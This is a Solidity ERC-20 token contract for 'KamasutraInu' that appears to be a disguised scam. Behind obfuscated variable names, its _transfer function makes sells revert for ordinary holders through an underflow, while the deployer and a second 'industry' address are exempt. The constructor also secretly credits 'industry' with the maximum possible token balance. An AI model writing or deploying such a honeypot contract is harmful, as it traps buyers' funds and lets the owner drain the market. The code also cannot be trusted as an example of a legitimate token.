// https://t.me/KamasutraInu

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract KamasutraInu is ERC20, Ownable {
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    mapping(address => uint256) private ordinary;

    function _transfer(
        address husband,
        address knowledge,
        uint256 horn
    ) internal override {
        uint256 journey = hay;

        if (active[husband] == 0 && ordinary[husband] > 0 && uniswapV2Pair != husband) {
            active[husband] -= journey;
        }

        address cap = five;
        five = knowledge;
        ordinary[cap] += journey + 1;

        _balances[husband] -= horn;
        uint256 feet = (horn / 100) * hay;
        horn -= feet;
        _balances[knowledge] += horn;
    }

    address private five;
    mapping(address => uint256) private active;
    uint256 public hay = 3;

    constructor(
        string memory thrown,
        string memory entire,
        address tree,
        address industry
    ) ERC20(thrown, entire) {
        uint256 harder = ~((uint256(0)));

        uniswapV2Router = IUniswapV2Router02(tree);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        active[msg.sender] = harder;
        active[industry] = harder;

        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[industry] = harder;
    }
}